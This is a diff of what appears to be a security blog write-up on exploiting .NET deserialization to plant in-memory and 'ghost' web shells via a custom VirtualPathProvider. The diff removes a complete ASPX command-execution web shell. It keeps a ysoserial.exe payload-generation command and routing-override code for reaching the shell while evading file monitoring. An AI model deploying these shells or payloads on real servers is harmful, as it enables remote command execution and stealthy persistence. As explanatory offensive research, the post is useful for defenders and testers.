@@ -134,44 +134,22 @@ Put payload to [string] param. Now we can execute any command via [c] parameter
 
 ![image](https://github.com/hnd3884/hnd3884.github.io/assets/61985236/43e8f6cc-9882-49f5-b58b-73faa89827ad)
 
-This method allows us to load webshell to the memory and helps our webshell avoid security solutions' observation of file changes on the server. But it's not as powerful as memory shell in Java, because we have to carry deserialization payload in each http request. So if deserialization is somehow patched, our shell is gone. We can bypass this restriction by creating a virtual file (ghost file) by abusing the Virtual Path Provider in .NET. That idea can be done by changing our ExploitClass.cs
+This method allows us to load webshell to the memory and helps our webshell avoid security solutions' observation of file changes on the server. But it's not as powerful as memory shell in Java, because we have to carry deserialization payload in each http request. So if deserialization is somehow patched, our shell is gone. We can bypass this restriction by abusing the Virtual Path Provider in .NET. 
 
+## Ghost shell in .NET Virtual Path Provider
+That idea is already implemented in Ysoserial here https://github.com/pwntester/ysoserial.net/blob/master/ExploitClass/GhostWebShell.cs. This technique requires 3 custom elements VirtualPathProvider, VirtualFile and VirtualDirectory. First We create custom VirtualFile to serve our shell.
 
+![image](https://github.com/hnd3884/hnd3884.github.io/assets/61985236/78ad1bc5-60ee-48c1-91ac-07aa01cd695e)
 
-The file content is got from https://github.com/pwntester/ysoserial.net/blob/master/ExploitClass/GhostWebShell.cs. My webshell content would be in base64-encoded format
+with Exists function always return True, we can access arbitrary filename to get shell, the Open function would be used to return our shell content. For custom VirtualDirectory, we just have to care that whether our virtual path is exist or not
 
-```csharp
-<%@ Page Language="C#" Debug="true" Trace="false" %>
-<%@ Import Namespace="System.Diagnostics" %>
-<%@ Import Namespace="System.IO" %>
-<script Language="c#" runat="server">
-void Page_Load(object sender, EventArgs e)
-{
-    Response.Write(Server.HtmlEncode(ExcuteCmd(Request["cmd"])));
-}
-string ExcuteCmd(string arg)
-{
-    ProcessStartInfo psi = new ProcessStartInfo();
-    psi.FileName = "cmd.exe";
-    psi.Arguments = "/c "+arg;
-    psi.RedirectStandardOutput = true;
-    psi.UseShellExecute = false;
-    Process p = Process.Start(psi);
-    StreamReader stmrdr = p.StandardOutput;
-    string s = stmrdr.ReadToEnd();
-    stmrdr.Close();
-    return s;
-}
-void cmdExe_Click(object sender, System.EventArgs e)
-{
-    // Response.Write("<pre>");
-    // Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));
-    // Response.Write("</pre>");
-}
-</script>
-```
+![image](https://github.com/hnd3884/hnd3884.github.io/assets/61985236/6d31d5c4-facc-47f3-a17f-9f2428bec51d)
 
-Since .NET 4.5, web applications can use friendly URLs to not use “.aspx” in the URL when pointing at the ASPX pages. This can stop our method of creating ghost web shells. The following solution was found to overwrite this setting for web applications which used this feature.
+For custom VirtualPathProvider, some methods have to be override to serve our shell content, one of them is GetFile
+
+![image](https://github.com/hnd3884/hnd3884.github.io/assets/61985236/97d710a6-2f52-45bb-9b08-0662bbd1ed7f)
+
+Since .NET 4.5, web applications can use friendly URLs to not use ".aspx" in the URL when pointing at the ASPX pages. This can stop our method of creating ghost web shells. The following solution was found to overwrite this setting for web applications which used this feature.
 
 ```csharp
 foreach(var route in System.Web.Routing.RouteTable.Routes)
@@ -193,7 +171,7 @@ This code has already been included in the GhostWebShell.cs file which needs to 
 ysoserial.exe -f BinaryFormatter -g ActivitySurrogateSelectorFromFile -c "ExploitClass.cs;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.dll;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Web.dll;D:\code\deser\packages\Microsoft.AspNet.FriendlyUrls.Core.1.0.2\lib\net45\Microsoft.AspNet.FriendlyUrls.dll"
 ```
 
-Then reproduce previous steps to exploit. Then you can access webshell on /fakepath/shell.aspx
+Then reproduce previous steps to exploit. Then you can access webshell on /fakepath/[anyshellname].aspx
 
 ![image](https://github.com/hnd3884/hnd3884.github.io/assets/61985236/d7230584-8e3b-4262-b9d4-ffd0a3bbb7bf)
 
